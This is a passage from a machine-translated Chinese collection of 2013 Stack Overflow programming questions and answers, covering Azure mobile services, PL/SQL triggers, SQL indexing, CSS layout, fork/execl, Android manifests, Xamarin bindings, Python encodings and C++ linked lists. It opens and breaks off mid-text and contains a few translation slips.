它也很容易编译而没有错误。它显示在它使用的代码中

```
SetWinEventHook(EVENT_SYSTEM_MOVESIZESTART, EVENT_SYSTEM_MOVESIZEEND, 
```

以及用于挂钩过程的自定义 dll。它还显示了一些其他技巧。从未在其他任何地方见过 SetWinEventHook。如果您学到了一些东西，请点赞。

该死的当然它也有一些窗户。

# java - 用于来自我的 Android 应用程序的持久数据的 Azure 移动服务不起作用

> ID：15750039
> 
> 赞同：0
> 
> 时间：2013-04-01T19:12:45.543
> 
> 标签：java, android, azure, azure-mobile-services

我需要帮助，这似乎是一个简单的问题，但我坚持了好几天。我正在尝试使用 Azure 移动服务来保存我的 Android 应用程序中的数据。我现在遇到的问题是我有一个数据传输对象，其中有几个字段对应于 Azure 数据库表中的列。这是一个简单的表，遵循所有步骤......我做错了什么？

```
 package com.bn7.rotabn7;
    import java.net.MalformedURLException;
    import com.microsoft.windowsazure.mobileservices.*;
    import android.os.Bundle;
    import android.app.Activity;
    import android.util.Log;
    import android.view.Menu;

    public class MainActivity extends Activity {
        private MobileServiceClient mClient;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            try {
                 mClient = new MobileServiceClient( 
                        "https://ocamorana.azure-mobile.net/", 
                        "hCzcrsFYhkGmxPvQDNxyqBXjZwjXlK99", 
                        this 
                        );
                Item item = new Item(); 
                item.IdPhone = "Awesome item"; 
                item.DateTimePhone = "Awesome item"; 
                item.LatitudePhone = -43; 
                item.LongetudePhone = -23; 
                item.ActivePhone = false; 
                mClient.getTable(Item.class).insert(item, new TableOperationCallback<Item>() {
                     public void onCompleted(Item entity, Exception exception, ServiceFilterResponse response) { 
                        if (exception == null) { 
                             // Insert succeeded 
                                                } else { 
                             // Insert failed
                            Log.d("Insert failed", "*---------------------------------------------------------------*");
                            Log.d("Insert failed", "Error in activity", exception);  // log the error
                            Log.d("Insert failed", "*---------------------------------------------------------------*");
                        } 
                     } 
                });
            } catch (MalformedURLException e) {
                Log.d("MalformedURLException", e.toString());
            }
    }

        @Override
        public boolean onCreateOptionsMenu(Menu menu) {
            // Inflate the menu; this adds items to the action bar if it is present.
            getMenuInflater().inflate(R.menu.activity_main, menu);
            return true;
        }

    }

    package com.bn7.rotabn7;

    public class Item { 
        public int Id; 
        public String IdPhone;
        public String DateTimePhone;
        public double LatitudePhone;
        public double LongetudePhone;
        public boolean ActivePhone;
        }

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.bn7.rotabn7"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="10"
        android:targetSdkVersion="17" />
    <uses-permission android:name="INTERNET"/>

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name="com.bn7.rotabn7.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

> 活动 om.microsoft.windowsazure.mobileservices.MobileServiceException 出错：处理请求时出错。com.microsoft.windowsazure.mobileservices.MobileServiceConnection$1.onNext(MobileServiceConnection.java:121) com.microsoft.windowsazure.mobileservices.MobileServiceClient$4.handleRequest(MobileServiceClient.java:429) com.microsoft.windowsazure.mobileservices.MobileServiceConnection.start( MobileServiceConnection.java:92) com.microsoft.windowsazure.mobileservices.RequestAsyncTask.doInBackground(RequestAsyncTask.java:77) com.microsoft.windowsazure.mobileservices.RequestAsyncTask.doInBackground(RequestAsyncTask.java:1) android.os.AsyncTask$2.call (AsyncTask.java:185) java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:306) java.util.concurrent.FutureTask.run(FutureTask.java: *-------------------------------------------------- -------------*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T00:30:22.827

我的第一个猜测是您缺少清单中的 Internet 权限（因为它抱怨 UnknownHost 这通常表明应用程序无法连接到 Internet）。确保这是在您的清单中：

`<uses-permission android:name="android.permission.INTERNET" />`

# javascript - 包含带有 javascript 小部件的 CSS 而不会弄乱主机页面

> ID：15750045
> 
> 赞同：0
> 
> 时间：2013-04-01T19:13:00.540
> 
> 标签：javascript, css, twitter-bootstrap, widget

我正在制作一个小部件类型的东西，它依赖于引导程序中的一些 CSS。这个小部件将被插入到主机页面中，如下所示：

```
<script type="text/javascript" src="http://mydomain.com/MyWidget.ashx?param1=value"></script>
<div id="com-mydomain-widget-placeholder"></div> 
```

MyWidget.ashx将在其中完成大量工作并为我的小部件加载*一些*`#com-mydomain-widget-placeholder`html。

我的问题是，我该如何处理我的 CSS？我正在使用许多 twitter boostrap 库来做事，但提取我正在使用的所有内容并为其创建不同的名称/类似乎非常耗时。但是，如果我包含整个引导 css 文件，它可能会搞砸我的客户网页（在我的情况下不会......但我想以正确的方式做到这一点）。我该怎么做呢？

还有一种方法可以检测他们是否已经加载了 twitter Bootstrap CSS 的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:21:29.487

如果主机页面使用 IFrame 加载小部件，则应该将 DOM 彼此隔离。

# plsql - PLS-00103 触发器错误

> ID：15750052
> 
> 赞同：0
> 
> 时间：2013-04-01T19:13:27.150
> 
> 标签：plsql

如果价格上涨超过 10%，这个触发器应该会抛出一个错误。出于某种原因，我收到 PLS-00103 错误。

```
CREATE OR REPLACE TRIGGER product_price_updt
BEFORE UPDATE ON PRODUCT
FOR EACH ROW
DECLARE
price_error VARCHAR2(100);
BEGIN
IF (:new.price > :old.price * 1.1) THEN raise price_error;
END IF;
EXCEPTION 
when price_error then ('Price increase is greater than 10%, update cancelled');
END; 
```

这是我编译时看到的。

```
Error(7,78): PLS-00103: Encountered the symbol ")" when expecting one of the following:     * & = - + < / > at in is mod remainder not rem    <an exponent (**)> <> or != or ~= >= <= <> and or like like2    like4 likec as between || multiset member submultiset 
```

也许我的语法错误并且错误具有误导性。我无法找到问题所在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:21:12.283

RAISE 必须与 EXCEPTION 一起使用 - 在这里您将它与 VARCHAR2 参数一起使用，这是一个问题。我可以看到的另一个是在您的异常块中，您有一个字符串（'价格上涨大于 10%，更新已取消'），您需要某种函数调用。我建议将您的触发器重写为：

```
CREATE OR REPLACE TRIGGER product_price_updt
  BEFORE UPDATE ON PRODUCT
  FOR EACH ROW
DECLARE
  price_error EXCEPTION;
BEGIN
  IF (:new.price > :old.price * 1.1) THEN
    raise price_error;
  END IF;
EXCEPTION 
  when price_error then
    DBMS_OUTPUT.PUT_LINE('Price increase is greater than 10%, update cancelled');
END product_price_updt; 
```

分享和享受。

# sql-server - 聚集和非聚集索引 - SQL Server 和 Oracle？

> ID：15750058
> 
> 赞同：4
> 
> 时间：2013-04-01T19:14:04.883
> 
> 标签：sql-server, database, oracle, clustered-index, non-clustered-index

聚集和非聚集索引的概述 - 不是特定于数据库的（据我了解）：

聚集索引：数据的物理顺序。因此，一张表只能有一个聚集索引。

非聚集索引：每个表可以配置一个或多个非聚集索引。不直接影响数据页面的组织。

Microsoft SQL Server 和 Oracle “管理”聚簇索引和非聚簇索引的方式有区别吗？还是整个星展银行都一样？

任何指导都会很棒！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:24:55.190

Oracle 没有聚集索引的概念。因此，您认为问题可能与数据库无关的假设是有缺陷的。Oracle 也没有 SQL Server 那样的“页面”概念。

对于表中数据的物理顺序非常重要的情况，Oracle 允许您将表定义为索引组织表或单表哈希集群。但是实现与聚集索引完全不同。例如，索引组织的表会将表的数据存储在索引中，因此没有表段（除非您定义了溢出段）。

# jquery - HTML 一般布局问题

> ID：15750062
> 
> 赞同：0
> 
> 时间：2013-04-01T19:14:23.720
> 
> 标签：jquery, html, css, layout

横幅是我想要的地方，尽管使用 jquery masonry 的框重叠了它，我在这里做错了什么？...

html

```
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="masonry.js"></script>
<script>
$(function () {
      $('#container').masonry({
          columnWidth: 1,
          itemSelector: 'div'
      });
});
</script>

<div id="banner">
    <img src="images/banner.png"/>
</div>

<div id="logo">
</div>

<div id="imagetrans">
<div id="container" class="clearfix masonry">

<div class="box1"> 
    <img class="bottom" src="images/eventbox2.png"/>
    <img class="top" src="images/eventbox.png"/>
</img></div>

<div class="box2">
    <img class="bottom" src="images/forumbox2.png"/>
    <img class="top" src="images/forumbox.png"/>
</img></div>    

<div class="box1"> 
    <img class="bottom" src="images/eventbox2.png"/>
    <img class="top" src="images/eventbox.png"/>
</img></div>

<div class="box1"> 
    <img class="bottom" src="images/eventbox2.png"/>
    <img class="top" src="images/eventbox.png"/>
</img></div>

<div class="box3">
    <img class="bottom" src="images/top10box2.png"/>
    <img class="top" src="images/top10box.png"/>
</img></div>

<div class="box1"> 
    <img class="bottom" src="images/eventbox2.png"/>
    <img class="top" src="images/eventbox.png"/>
</img></div>
</div>
</div>
</div> 
```

和CSS

```
body {
  width:900px;
  height:100%;
  margin:0 auto;
  background-image: url(images/gridbg.png);
}

#banner {
  position: absolute;
  left: 0;
  right: 0;
  top: 0px;
}

#container > div {
  margin: 5px;
}
.box1 {
  width:350px;
  height:250px;
}

.box2 {
  width:150px;
  height:150px;
}

.box3 {
  width:150px;
  height:350px;
}

#imagetrans {
  position:relative;
  margin:0 auto;
}

#imagetrans img.top:hover,
#container > div img.top:hover {
  opacity:0;
}

#imagetrans img,
#container > div img {
  position:absolute;
  -webkit-transition: opacity 0.3s ease-in-out;
  -moz-transition: opacity 0.3s ease-in-out;
  -o-transition: opacity 0.3s ease-in-out;
  transition: opacity 0.3s ease-in-out;
} 
```

有任何想法吗？因为我可以通过从上到下更改编码轻松地将横幅放置在底部，尽管如果我可以将它放在屏幕顶部，我会更喜欢它，但不太确定有什么问题......

![在此处输入图像描述](https://i.stack.imgur.com/Ubkdh.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:22:24.850

尝试改变：

```
#banner {
  position: absolute;
  left: 0;
  right: 0;
  top: 0px;
} 
```

到：

```
#banner {
   height: 100px; // whatever your banner height is.
} 
```

或者：

```
#banner {
  position: fixed;
  left: 0;
  right: 0;
  top: 0px;
} 
```

如果您使用固定位置的方法，则需要添加某种上边距或某种间隔，以将页面内容降低标题的高度。

# c++ - C++ 中的 Fork() 和 Execl()，Execl() 失败

> ID：15750068
> 
> 赞同：1
> 
> 时间：2013-04-01T19:14:34.533
> 
> 标签：c++, string, character, exec, fork

我正在尝试在 C++ 中运行 execl()，但它失败了，我不知道为什么。

```
 string fileName = "test.txt";
  string computerName = "jssoile@palmetto.school.edu";
  pid_t pid;
  int    status;

  if ((pid = fork()) < 0) {     /* fork a child process           */
     printf("*** ERROR: forking child process failed\n");
     exit(1);
  }
  else if (pid == 0) {          /* for the child process:         */
     if (execl("scp", fileName.c_str(), computerName.c_str(), NULL) < 0) {     /* execute the command  */
        printf("*** ERROR: exec failed\n");
        exit(1);
     }
  }
  else {                                /* for the parent:      */
     while (wait(&status) != pid)       /* wait for completion  */
     ;
  } 
```

当我运行它时，我的 execl() 调用失败并打印出来

```
*** ERROR: exec failed 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:17:43.360

您正在使用`exec`需要完整路径作为第一个参数的变体。

代替：

```
execl( "scp", ... ) 
```

与

```
execl("/usr/bin/scp", ...) 
```

或者

```
execlp("scp", ... ) 
```

参考： http: [//linux.die.net/man/3/execl](http://linux.die.net/man/3/execl)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:18:13.490

您的 execl 语法不正确。您需要指定 scp（包括 scp）的完整路径作为第一个参数，然后是参数列表。

# android - 为什么需要将活动/服务显式添加到 Android 清单中？

> ID：15750070
> 
> 赞同：4
> 
> 时间：2013-04-01T19:14:44.157
> 
> 标签：android, service, android-activity, android-manifest

在 Android 开发中，您必须将所有活动和/或服务添加到清单文件中。我知道如何做到这一点，但我不明白**为什么**我需要这样做。这似乎是一个不必要的跳跃。

Android 文档有所帮助，但我仍然不清楚“为什么”（[http://developer.android.com/guide/topics/manifest/manifest-intro.html](http://developer.android.com/guide/topics/manifest/manifest-intro.html)）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T19:19:54.197

我至少可以回答活动的部分**原因**。

清单也是您声明 IntentFilter 的地方，这是系统如何理解您的应用程序所做的事情。即当用户尝试拍照时，您的活动是否应该是难以辨认的选择？选择一个文件？分享一段文字？除此之外，IntentFilter 还告诉 Launcher 应用程序您希望将您的活动包含在 Applications 抽屉中。

您还可以在必须在清单中完成的活动上设置几个配置选项，即 SingleTop。如果没有清单中的声明，就没有地方声明这些配置。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T19:25:05.613

规则是：只能调用 Manifest 中列出的那些活动。列出的其中一些不仅可以由您的应用程序调用，而且可以由其他一些应用程序调用。因此，Android 会扫描清单并确定可以调用哪些活动。我认为他们只是在这里遵循最简单的逻辑。任何“默认值”，例如“不需要在 Manifest 中声明 Activity，如果..”将是不必要的复杂化。他们不应该关心程序员的便利性，而是关心清晰度（我认为）。

# xamarin.ios - 绑定问题：扩展类导致方法调用自身？

> ID：15750073
> 
> 赞同：1
> 
> 时间：2013-04-01T19:14:55.723
> 
> 标签：xamarin.ios, xamarin

我有另一个与绑定相关的问题（绑定[问题：在绑定类调用基础方法调用覆盖方法。导致无限递归](https://stackoverflow.com/questions/15693762/issues-with-bindings-calling-base-method-on-binding-class-calls-override-method)），它已经变得难以处理，所以我想我会从一个包含最好的新问题开始我目前知道的信息。

我正在尝试在 MonoTouch 中进行的项目中使用 Cordova。我一直在为 Cordova 制作绑定。

这是我对 Cordova 2.4.0 类的绑定（可在此处获取[https://github.com/apache/cordova-ios/tree/2.4.0/CordovaLib/Classes](https://github.com/apache/cordova-ios/tree/2.4.0/CordovaLib/Classes)）：（*请注意，这不是一个完整的绑定，只是到目前为止我需要的作品*）

```
interface CDVScreenOrientationDelegate {
    [Export ("supportedInterfaceOrientations")]
    uint SupportedInterfaceOrientations ();

    [Export ("shouldAutorotateToInterfaceOrientation:")]
    bool ShouldAutoRotateToInterfaceOrientation (UIInterfaceOrientation interfaceOrientation);

    [Export ("shouldAutorotate")]
    bool ShouldAutoRotate ();
}

[BaseType (typeof (UIViewController))]
interface CDVViewController : CDVScreenOrientationDelegate {
    [Export ("webView")]
    UIWebView WebView { get; set; }

    [Export ("pluginObjects")]
    NSMutableDictionary PluginObjects { get; }

    [Export ("pluginsMap")]
    NSDictionary PluginsMap { get; }

    [Export ("settings")]
    NSDictionary Settings { get; }

    [Export ("whitelist")]
    CDVWhitelist Whitelist { get; }

    [Export ("loadFromString")]
    bool LoadFromString { get; }

    [Export ("useSplashScreen")]
    bool UseSplashScreen { get; set; }

    [Export ("activityView")]
    UIActivityIndicatorView ActivityView { get; }

    [Export ("imageView")]
    UIImageView ImageView { get; }

    [Export ("wwwFolderName")]
    string WwwFolderName { get; set; }

    [Export ("startPage")]
    string StartPage { get; set; }

    [Export ("commandQueue")]
    NSObject CommandQueue { get; set; }

    [Export ("commandDelegate")]
    NSObject CommandDelegate { get; set; }

    [Export ("userAgent")]
    string UserAgent { get; }

    [Export ("printMultitaskingInfo")]
    void PrintMultitaskingInfo ();

    [Export ("createGapView")]
    void CreateGapView ();

    [Export ("newCordovaViewWithFrame:")]
    UIWebView NewCordovaView(RectangleF bounds);

    [Export ("javascriptAlert:")]
    void JavascriptAlert (string text);

    [Export ("appURLScheme")]
    string AppUrlScheme ();

    [Export ("parseInterfaceOrientations:")]
    NSArray ParseInterfaceOrientations (NSArray orientations);

    [Export ("supportsOrientation:")]
    bool SupportsOrientation (UIInterfaceOrientation orientation);

    [Export ("getCommandInstance:")]
    NSObject GetCommandInstance (string pluginName);

    [Export ("registerPlugin:withClassName:")]
    void RegisterPluginWithClassName (CDVPlugin plugin, string className);

    [Export ("URLisAllowed:")]
    bool UrlIsAllowed (NSUrl url);

    [Static] [Export ("getBundlePlist:")]
    NSDictionary GetBundlePlist (string plistName);

    [Static] [Export ("applicationDocumentsDirectory")]
    string ApplicationDocumentsDirectory ();

    // The following methods and properties come from UIWebViewDelegate, but we can't do multiple inheritance
    //[Export ("webView:shouldStartLoadWithRequest:navigationType:")]
    //bool ShouldStartLoad (UIWebView webView, NSUrlRequest request, UIWebViewNavigationType navigationType);
}

[BaseType (typeof(NSObject))]
interface CDVWhitelist {
    [Export ("whitelist")]
    NSArray Whitelist { get; }

    [Export ("expandedWhitelist")]
    NSArray ExpandedWhitelist { get; }

    [Export ("allowAll")]
    bool AllowAll { get; }

    [Export ("initWithArray:")]
    IntPtr Constructor (NSArray array);

    [Export ("URLIsAllowed:")]
    bool UrlIsAllowed (NSUrl url);

    [Export ("schemeIsAllowed:")]
    bool SchemeIsAllowed (string scheme);

    [Export ("errorStringForURL:")]
    string ErrorStringForUrl (NSUrl url);
}

[BaseType (typeof(NSObject))]
interface CDVPlugin {
    [Export ("webView")]
    UIWebView WebView { get; set; }

    [Export ("viewController")]
    UIViewController ViewController { get; set; }

    [Export ("commandDelegate")]
    NSObject CommandDelegate { get; set; }

    [Export ("hasPendingOperation")]
    bool HasPendingOperation { get; }

    [Export ("initWithWebView:")]
    CDVPlugin InitWithWebView (UIWebView theWebView);

    [Export ("handleOpenURL:")]
    void HandleOpenUrl (NSNotification notification);

    [Export ("onAppTerminate")]
    void OnAppTerminate ();

    [Export ("onMemoryWarning")]
    void OnMemoryWarning ();

    [Export ("onReset")]
    void OnReset ();

    [Export ("appDelegate")]
    NSObject AppDelegate ();
} 
```

这是使用来自[Monotouch Binding Syntax For Protocols](https://stackoverflow.com/questions/9477037/monotouch-binding-syntax-for-protocols)的 miguel.de.icaza 协议。这没有 CDVViewController 也采用的 UIWebViewDelegate

```
@interface CDVViewController : UIViewController <UIWebViewDelegate, CDVScreenOrientationDelegate>{
    @protected
    CDVCommandDelegateImpl* _commandDelegate;
    @protected
    CDVCommandQueue* _commandQueue; 
    NSString* _userAgent;
} 
```

[或者，我发现 Rolf Bjarne Kvinge 在http://monotouch.2284126.n4.nabble.com/Objective-C-protocol-binding-method-not-invoked-td4105828.html](http://monotouch.2284126.n4.nabble.com/Objective-C-protocol-binding-method-not-invoked-td4105828.html)推荐 Adopts 语法。不幸的是，我无法使其正常工作，因为当我尝试构建绑定时，它会抱怨无法`System.Type`符合`String`. 这是一个不同的问题。

当我尝试继承 CDVViewController 时，我遇到了其他问题。具体在调用 ViewDidLoad 后，系统调用我的子类'`ShouldAutoRotateToInterfaceOrientation`

为了确认这一点，我做了以下事情：

```
public class WebViewController : CDVViewController
{
    public override bool ShouldAutoRotateToInterfaceOrientation (MonoTouch.UIKit.UIInterfaceOrientation interfaceOrientation)
    {
        Console.WriteLine ("Enter ShouldAutoRotateToInterfaceOrientation");
        var output = base.ShouldAutoRotateToInterfaceOrientation;
        Console.WriteLine ("Leave ShouldAutoRotateToInterfaceOrientation");
        return output;
    }
} 
```

我在 中放了一个断点`ShouldAutoRotateToInterfaceOrientation`，当我沿着方法前进时，当我到达 时`base.ShouldAutoRotateToInterfaceOrientation`，它只是跳回到这个方法的开头，我的调用堆栈现在已经添加了`Cordova.CDVViewController.ShouldAutoRotateToInterfaceOrientation`，但是查看这个方法的源代码（可[在此处](https://github.com/apache/cordova-ios/blob/2.4.0/CordovaLib/Classes/CDVViewController.m#L370)获得），它从不尝试调用自身或子类实现。相反，它在内部调用`supportsOrientation:`，它检查一个数组以查看是否支持此方向。

无论如何，我知道`supportsOrientation:`最终会调用它，我也尝试从它调用它`ShouldAutoRotateToInterfaceOrientation`，但后来我只是在该方法中得到了奇怪的回调行为。

如果我直接实例化`CDVViewController`，那么一切似乎都按预期工作，但我需要为我的项目重写一些方法。当我扩展`CDVViewController`时，这种行为开始发生。

我对此感到很困惑，我无法弄清楚我做错了什么，所以任何帮助将不胜感激。

**更新 #1**根据 Rolf 的要求，这里是生成的类。我希望这就是你要找的。出于空间原因，我将其添加为 Gist 此处[https://gist.github.com/innopal/5288047](https://gist.github.com/innopal/5288047)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-04T23:23:02.560

正如 Rolf 所指出的，这个问题的解决方案是我`-e`在我的论点中包含了标志。

如帮助中所述`btouch`，

```
-e  Generates smaller classes that cannot be subclassed (previously called 'external mode'). 
```

所以这里的问题是我在不知不觉中使用了一个专门使类不可子类化的标志，然后尝试对它们进行子类化。

# amazon-web-services - 视频聊天：可扩展性问题

> ID：15750076
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:04.173
> 
> 标签：amazon-web-services, scalability, red5, rtmp, videochat

我们使用 Red5 媒体服务器作为 Flash 视频聊天应用程序的后端。最近我们的用户流量显着增加，这导致视频聊天下降。虽然使用 EC2 负载均衡器管理 HTTP 流量相当简单，但我们不确定如何处理 RTMP 流量。

我们如何扩展我们的媒体服务器并管理 RTMP 流量（使用 AWS 或任何其他服务）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T23:05:39.503

[CloudFront](http://aws.amazon.com/cloudfront)（亚马逊的 CDN）支持 RTMP。

# capybara - Capybara 2.0 模糊选择

> ID：15750077
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:05.670
> 
> 标签：capybara

我有一个下拉列表，其中包含 Value WEP 和另一个 WEP 值，但具有不同的 Text WEP 和 WEP（企业）。如何指定在 capybara 2.0 中选择哪一个？现在它正在抛出一个模棱两可的错误，因为两者都匹配。

这是我现在正在做的事情

```
 select @security_type[@index], from: 'wifis__encryption_type' 
```

和@security_type[@index] = WEP

# java - 所以我偶然发现了一些东西......文件扫描媒体扫描仪连接

> ID：15750078
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:06.023
> 
> 标签：java, android, createfile

我将如何使用媒体扫描仪连接使文件对 Android 文件传输可见。在这里指一个问题（[Android File Transfer 看不到应用程序创建的文件夹](https://stackoverflow.com/questions/15007139/android-file-transfer-cannot-see-a-folder-created-by-app)）

目前我正在编写一个应用程序，只是想确保该文件夹在那里，如果没有创建它。最终，文件夹中的数据要么需要从文件夹中取出，要么需要添加更多数据。

感谢您对这个扫描仪的东西有点困惑的帮助。

```
 File internalMemory = new File("/mnt/sdcard/FMCW File Archive");
    if(internalMemory.exists() && internalMemory.isDirectory()) {
        mFileList = internalMemory.listFiles();
    }else{
        createDirIfNotExist("/FMCW File Archive");
    } 
```

下面是方法

```
 public static boolean createDirIfNotExist(String path) {
    boolean ret = true;
    File file = new File(Environment.getExternalStorageDirectory() + path);
    if (!file.exists()) {
        if (!file.mkdirs()) {
            Log.e("TravellerLog :: ", "Problem creating Image folder");
            ret = false;
        }
    }
    return ret;
} 
```

-埃文

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:27:48.917

看看这个关于如何使用 MediaScannerConnection 的例子：

[http://www.java2s.com/Code/Android/Media/UsingMediaScannerConnection.htm](http://www.java2s.com/Code/Android/Media/UsingMediaScannerConnection.htm)

另请查看另一个问题的答案中提供的链接 CommonsWare：[MediaScannerConnection 的静态 scanFile 方法](http://developer.android.com/reference/android/media/MediaScannerConnection.html#scanFile%28android.content.Context,%20java.lang.String%5B%5D,%20java.lang.String%5B%5D,%20android.media.MediaScannerConnection.OnScanCompletedListener%29)

只是一个小提示：不要使用名称中带有空格的文件夹名称......

# python - Utf-8 - ascii - unicode - 示例 [Python]

> ID：15750079
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:05.767
> 
> 标签：python, utf-8

我试图了解 UTF-8、ASCII 和 Unicode 之间的区别。我已经阅读了[Unicode、UTF、ASCII、ANSI 格式差异](https://stackoverflow.com/questions/700187/unicode-utf-ascii-ansi-format-differences)。但是我从 Python 中得到了一些错误，我不知道如何才能看到我的字符串具有哪种格式。

例如：

```
1# 'Klaus-Groth-Stra&#223;e, Ballahausen'
2# 'Capit\xe1n\n'
3# u'Capit\xe1n\n' 
```

我推测

*   3# = Unicode，因为`u'`?
*   1#=？
*   2#=？

我已经尝试将字符串 #1 写入文件并为自己编写了一个小函数

```
def escape(html):
 html=html.replace('&#246;','ö')
 html=html.replace('&#214;','Ö')
 html=html.replace('&#228;','ä')
 html=html.replace('&#196;','Ä')
 html=html.replace('&#252;','ü')
 html=html.replace('&#220;','Ü')
 html=html.replace('&#223;','ß')
 return html 
```

在我将字符串写入`txt`文件之前，我想替换字母以在我的文本文件中获得正确的拼写（*Klaus-Groth-Straße，Buchholz in der Nordheide*）。

但它不起作用：/

你能告诉我我的 3 个示例属于哪种字符串 - Unicode 或 ASCII 或 UTF-8？以及如何`txt`使用 #1 之类的字符串将正确的拼写写入 a？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:47:04.193

你是对的，示例 #3 是一个 Unicode 字符串，因为前导`u`. 这可能是最容易处理的。

#1 和 #2 都是字节串。#1 完全由 ASCII 字符组成，因此您不会从中得到任何 Unicode 错误；但是它包含一个您可能希望将其转换为字符的 HTML 实体。转换 HTML 实体有多种策略，请参阅问题[Decoding HTML entity with Python](https://stackoverflow.com/questions/1208916/decoding-html-entities-with-python)。结果应该是一个 Unicode 字符串。

#2 包含一个不是 ASCII 的字符，但它也不是 Unicode。如果它是一个 UTF-8 字符串，那么至少有 2 个十六进制字节，但你只有一个。这意味着它是其他一些字符编码的一部分，需要在使用它之前进行解码。Windows 1252 代码页可能是一个不错的猜测。

```
>>> 'Capit\xe1n\n'.decode('cp1252')
u'Capit\xe1n\n'
>>> print 'Capit\xe1n\n'.decode('cp1252')
Capitán 
```

当您写回文件时，您需要将 Unicode 字符串转换回字节字符串。`encode`使用字符串上的方法执行此操作。你需要决定你希望你的文件采用什么编码。

```
f.write(u'Capit\xe1n\n'.encode('utf-8') 
```

或者

```
f.write(u'Capit\xe1n\n'.encode('cp1252') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T20:23:19.050

在实际上不知道出了什么问题的地方，我自己遇到了一个类似的问题，我现在已经解决了。我使用Delphi9，我的问题是从文件中读取UTF8，然后再写回来。长话短说，各种口音和/或坟墓或类似的东西在写作时从字母中消失了。编码或解码 UTF8 的工具似乎并没有完全完成这项工作，或者 Delphi 本身在后台做了一些隐藏的工作。

我最终编写了自己的 UTF8 解码器和编码器，现在一切正常。UTF8 方案实际上非常简单。一点点位移和加法，你就在解码和编码上。我用这个：“https://www.rfc-editor.org/rfc/rfc3629”作为我工作的参考。

至少它为您提供了对 UTF8 标准的完美解释。

# objective-c - 计算 CSV 文件中的行数而不加载到内存中

> ID：15750081
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:07.560
> 
> 标签：objective-c, c, parsing, csv, file-io

我有一个非常大的 CSV 文件，大约 50k+ 行。我使用 CHCSVParser 逐行解析它，效果很好。

当数据被解析并添加到CoreData中时，我想向用户显示某种类型的进度。如果我知道行数，我可以只显示 numLinesParsed/totalLines。我想知道是否有一种快速的方法来计算 CSV 文件中的行数，而无需：

1.  全部加载到内存中
2.  花费超过几秒钟

我不知道我是否应该尝试做这个 Objective C 或者直接用 C 做会更好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:45:56.727

为什么不以字节为单位获取[文件的大小，](https://stackoverflow.com/questions/238603/how-can-i-get-a-files-size-in-c#)然后将其除以每行的字符（如果每行具有相同数量的字符）或将其除以处理的字符数以获得百分比？

ups：豪尔赫·努涅斯（Jorge Nunez）已经说过了……

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:53:03.213

我认为 C 没有办法在不将文件加载到内存的情况下获得行数，因为这似乎是一个操作系统级别的函数，至少对我来说......

如果您在 UNIX 机器上，您可以使用“wc”命令来获取任何文件的行数。您应该能够通过“system”命令使用 C 运行它并将输出重定向到一个临时文件，然后您可以非常快速地访问该文件并从那里解析行数。

如果您使用的是 Windows，您可以使用 findstr 命令 'findstr /R /N "^" file.txt" 来获取行数。注意，这将打印行一个冒号，然后是所有行文件。我相信你可以把这个输出减少一点，但我不知道该怎么做。

# c++ - 试图创建一个包含字符串 C++ 的链表

> ID：15750087
> 
> 赞同：0
> 
> 时间：2013-04-01T19:15:34.570
> 
> 标签：c++, string, pointers, linked-list

我目前正在研究一个链接列表，该列表将包含包含信息字符串的字符串。我正在使用一个看起来像这样的结构：

```
struct symbolTable
{
    string lexeme;
    string kind;
    string type;
    int offSet;
    symbolTable *nextSymbol;
    symbolTable *nextTable;
}; 
```

插入函数看起来有点像这样：

```
void MPParser::insertToSymbolTable(string identifier, string type, string kind)
{
    tempOffset++;
    symbolTable *tempNode;
    tempNode = (symbolTable*)malloc(sizeof(symbolTable));
    tempNode->kind = kind; //Run Time error Here..
    tempNode->type = type;
    tempNode->lexeme = identifier;
    tempNode->offSet = tempOffset;
    tempNode->nextTable = NULL;
    tempNode->nextSymbol = root;
    root = tempNode;
} 
```

程序编译，然后当我尝试运行并插入链接列表时，我收到此错误：

```
Unhandled exception at 0x5A6810D0 (msvcr110d.dll) in mpcompiler.exe: 0xC0000005: Access   violation writing location 0xCDCDCDCD. 
```

在指针中将字符串分配给另一个字符串的正确方法是什么？还是我做错了什么？任何帮助，将不胜感激！

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:18:28.700

使用`new`而不是`malloc()`正确构造字符串对象：

```
tempNode = new symbolTable; 
```

然后`delete`在以后需要释放节点时使用：

```
delete node; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T19:19:21.453

尝试将您的代码替换为

```
void MPParser::insertToSymbolTable(string identifier, string type, string kind)
{
    tempOffset++;
